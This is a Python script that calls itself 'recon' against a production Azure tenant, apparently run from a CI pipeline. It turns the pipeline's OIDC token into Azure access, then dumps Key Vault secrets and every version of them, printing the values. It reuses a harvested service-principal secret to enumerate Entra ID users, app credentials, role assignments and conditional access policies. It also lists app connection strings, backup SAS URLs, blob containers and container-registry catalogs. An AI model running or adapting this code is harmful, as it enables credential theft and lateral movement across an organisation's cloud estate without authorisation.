#!/usr/bin/env python3
"""Focused Azure recon #2 for Tebamoto #9. Read-only GETs."""
import os, json, base64, urllib.request, urllib.parse, urllib.error, sys

TENANT=os.environ["AZURE_TENANT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]; CLIENT=os.environ["AZURE_CLIENT_ID"]
LOGIN=f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"

def req(url, data=None, headers=None, method=None, timeout=40):
    h=dict(headers or {}); h.setdefault("User-Agent","curl/8.5.0")
    r=urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp: return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        try: return e.code, e.read()
        except Exception: return e.code, b""
    except Exception as e: return 0, str(e).encode()

def jb(b):
    try: return json.loads(b)
    except Exception: return None

def say(*a): print(*a, flush=True)

def token_for(client, scope, secret=None, assertion=None):
    f={"client_id":client,"grant_type":"client_credentials","scope":scope}
    if secret: f["client_secret"]=secret
    if assertion:
        f["client_assertion_type"]="urn:ietf:params:oauth:client-assertion-type:jwt-bearer"; f["client_assertion"]=assertion
    s,b=req(LOGIN, urllib.parse.urlencode(f).encode(), {"Content-Type":"application/x-www-form-urlencoded"})
    j=jb(b) or {}; return j.get("access_token"), s, j.get("error_description") or j.get("error") or ""

def claims(t):
    try:
        p=t.split(".")[1]; p+="="*(-len(p)%4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception: return {}
def auth(t): return {"Authorization":"Bearer "+t} if t else {}

# tokens
url=os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange"
s,b=req(url, headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
OIDC=(jb(b) or {}).get("value","")
ARM,_,_=token_for(CLIENT,"https://management.azure.com/.default",assertion=OIDC)
KV,_,_=token_for(CLIENT,"https://vault.azure.net/.default",assertion=OIDC)
say("[oidc] len",len(OIDC))

# get SPs from KV
sps={}
s,b=req("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers=auth(KV))
for it in (jb(b) or {}).get("value",[]):
    n=it["id"].rstrip("/").split("/")[-1]
    s2,b2=req(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{n}?api-version=7.4",headers=auth(KV))
    try:
        d=json.loads((jb(b2) or {}).get("value",""))
        if d.get("appId") and d.get("clientSecret"): sps[n]=d
    except Exception: pass
say("[sps]",sorted(sps))

# graph token for directory-audit
G=None
if "directory-audit-principal" in sps:
    G,st,err=token_for(sps["directory-audit-principal"]["appId"],"https://graph.microsoft.com/.default",secret=sps["directory-audit-principal"]["clientSecret"])
    c=claims(G or "")
    say("[graph token] st",st,"roles",c.get("roles"),"scp",c.get("scp"),"err",err[:100])

SITE=f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod"

def show(label, path, method=None, body=None, maxn=9000, tok=ARM, base=SITE):
    s,b=req(base+path, data=body, headers=auth(tok), method=method)
    txt=b.decode("utf-8","replace")
    say(f"\n### {label} st={s} len={len(b)}")
    say(txt[:maxn])
    return s,jb(b)

say("\n===== APP CONFIG BODIES =====")
for label,path in [
  ("site","?api-version=2023-12-01"),
  ("config/web","/config/web?api-version=2023-12-01"),
  ("config/appsettings","/config/appsettings?api-version=2023-12-01"),
  ("config/connectionstrings","/config/connectionstrings?api-version=2023-12-01"),
  ("authsettingsV2","/config/authsettingsV2?api-version=2023-12-01"),
  ("sourcecontrols","/sourcecontrols/web?api-version=2023-12-01"),
  ("backups","/backups?api-version=2023-12-01"),
  ("config/backup","/config/backup?api-version=2023-12-01"),
  ("slots","/slots?api-version=2023-12-01"),
  ("instances","/instances?api-version=2023-12-01"),
  ("site/deployments","/deployments?api-version=2023-12-01"),
  ("config/azurestorageaccounts POST","/config/azurestorageaccounts/list?api-version=2023-12-01"),
]:
    meth = "POST" if " POST" in label else None
    show(label,path,method=meth,body=b"" if meth else None)

# backup detail + storage URL
s,b=req(SITE+"/backups?api-version=2023-12-01",headers=auth(ARM)); j=jb(b) or {}
backup_urls=[]
for it in (j.get("value") or []):
    name=it.get("name"); say("[backupitem]",name,json.dumps(it.get("properties"))[:1200])
    s2,b2=req(f"{SITE}/backups/{name}?api-version=2023-12-01",headers=auth(ARM)); j2=jb(b2) or {}
    say("[backupdetail]",json.dumps(j2.get("properties"))[:2500])
    su=(j2.get("properties") or {}).get("storageAccountUrl")
    if su: backup_urls.append(su)
# backup config
s,b=req(SITE+"/config/backup?api-version=2023-12-01",headers=auth(ARM)); j=jb(b) or {}
su=(j.get("properties") or {}).get("storageAccountUrl")
if su: backup_urls.append(su)
say("[backupurls]",backup_urls)

# use any SAS URL to list container blobs
for su in backup_urls:
    try:
        u=urllib.parse.urlsplit(su)
        qs=urllib.parse.parse_qs(u.query)
        if qs.get("sv") and (qs.get("sp",[""])[0] and ("l" in qs.get("sp",[""])[0] or "r" in qs.get("sp",[""])[0])):
            base=f"{u.scheme}://{u.netloc}{u.path}"
            sep="&" if u.query else ""
            s,b=req(base+"?restype=container&comp=list&"+u.query, headers={"x-ms-version":"2021-08-06"})
            say(f"[backup-sas-list] {base} st={s} {b[:4000]!r}")
        else:
            # try blob listing anyway
            base=f"{u.scheme}://{u.netloc}{u.path}"
            s,b=req(base+"?restype=container&comp=list&"+u.query, headers={"x-ms-version":"2021-08-06"})
            say(f"[backup-url-list] {base} st={s} {b[:1500]!r}")
    except Exception as e:
        say("[backupurl] err",e)

# slots details
s,b=req(SITE+"/slots?api-version=2023-12-01",headers=auth(ARM)); j=jb(b) or {}
slots=j.get("value") or []
for sl in slots:
    nm=sl.get("name","").split("/")[-1]
    say("[slot]",nm,json.dumps(sl.get("properties"))[:1200])
    if nm:
        sb=f"{SITE}/slots/{nm}"
        for path in ["?api-version=2023-12-01","/config/web?api-version=2023-12-01","/config/appsettings?api-version=2023-12-01","/instances?api-version=2023-12-01"]:
            s2,b2=req(sb+path,headers=auth(ARM)); say(f"[slot:{nm}:{path}] st={s2} {b2[:1500]!r}")

# instances -> processes
s,b=req(SITE+"/instances?api-version=2023-12-01",headers=auth(ARM)); j=jb(b) or {}
for inst in (j.get("value") or []):
    nm=inst.get("name")
    say("[instance]",nm,json.dumps(inst.get("properties"))[:800])
    s2,b2=req(f"{SITE}/instances/{nm}/processes?api-version=2023-12-01",headers=auth(ARM))
    say(f"[processes:{nm}] st={s2} {b2[:2000]!r}")

# Key Vault secret versions
say("\n===== KV VERSIONS =====")
for n in ["cost-reader-principal","directory-audit-principal","reporting-service-principal","reporting-viewer-principal","secrets-sync-principal","sync-service-principal"]:
    s,b=req(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{n}/versions?api-version=7.4",headers=auth(KV))
    j=jb(b) or {}
    vers=[(it["id"].split("/")[-1], it.get("attributes",{})) for it in (j.get("value") or [])]
    say(f"[versions:{n}] st={s} count={len(vers)} {[v[0] for v in vers]}")
    for vid,attrs in vers:
        s2,b2=req(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{n}/{vid}?api-version=7.4",headers=auth(KV))
        val=(jb(b2) or {}).get("value")
        say(f"   {vid} st={s2} len={len(val) if val else 0} enabled={attrs.get('enabled')} val={val[:400] if val else ''}")

# ACR catalog with registry scope
say("\n===== ACR =====")
for scope in ["registry:catalog:*","registry:catalog:read"]:
    q=urllib.parse.urlencode({"service":"crtblplatprodx3euoz.azurecr.io","scope":scope})
    s,b=req(f"https://crtblplatprodx3euoz.azurecr.io/oauth2/token?{q}")
    j=jb(b) or {}; t=j.get("access_token")
    say(f"[acr-token:{scope}] st={s} len={len(t or '')} {b[:160]!r}")
    if t:
        s2,b2=req("https://crtblplatprodx3euoz.azurecr.io/v2/_catalog",headers=auth(t))
        say(f"[acr-catalog:{scope}] st={s2} {b2[:2000]!r}")
# ACR ARM tasks/runs/webhooks/tokens
for path in ["/tasks","/runs","/webhooks","/tokens","/scopeMaps","/connectedRegistries"]:
    s,b=req(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz{path}?api-version=2023-07-01",headers=auth(ARM))
    say(f"[acr{path}] st={s} {b[:1500]!r}")

# Graph deep dive
if G:
    say("\n===== GRAPH DETAILS =====")
    def g(path,label,maxn=5000):
        s,b=req("https://graph.microsoft.com/v1.0"+path,headers=auth(G))
        say(f"\n## {label} st={s}")
        say(b.decode("utf-8","replace")[:maxn])
        return jb(b) or {}
    g("/organization","organization")
    g("/users?$select=id,userPrincipalName,displayName,mail,accountEnabled,userType,createdDateTime,onPremisesSyncEnabled,lastPasswordChangeDateTime","users")
    apps=g("/applications?$select=id,appId,displayName,createdDateTime,passwordCredentials,keyCredentials,requiredResourceAccess,web,publicClient,identifierUris,signInAudience,notes&$top=999","applications")
    for a in (apps.get("value") or []):
        aid=a.get("id"); appid=a.get("appId")
        say(f"[app] {a.get('displayName')} appId={appid} id={aid} signIn={a.get('signInAudience')} notes={a.get('notes')}")
        for pc in (a.get("passwordCredentials") or []):
            say(f"   passwordCred displayName={pc.get('displayName')} hint={pc.get('hint')} start={pc.get('startDateTime')} end={pc.get('endDateTime')} keyId={pc.get('keyId')}")
        rra=json.dumps(a.get("requiredResourceAccess"))
        say(f"   rra={rra[:900]}")
        s2,b2=req(f"https://graph.microsoft.com/v1.0/applications/{aid}/federatedIdentityCredentials",headers=auth(G))
        say(f"   fedcred st={s2} {b2[:1200]!r}")
    sps2=g("/servicePrincipals?$select=id,appId,displayName,servicePrincipalType,accountEnabled,appRoleAssignmentRequired,notes&$top=999","servicePrincipals")
    for sp in (sps2.get("value") or []):
        say(f"[sp] {sp.get('displayName')} appId={sp.get('appId')} oid={sp.get('id')} type={sp.get('servicePrincipalType')} enabled={sp.get('accountEnabled')} notes={sp.get('notes')}")
    g("/oauth2PermissionGrants?$top=999","oauth2PermissionGrants")
    g("/directoryRoles?$top=999","directoryRoles")
    g("/roleManagement/directory/roleAssignments?$top=999","roleAssignments")
    g("/groups?$select=id,displayName,description,visibility,groupTypes&$top=999","groups")
    g("/identity/conditionalAccess/policies","caPolicies")

say("\n=== RECON2 DONE ===")
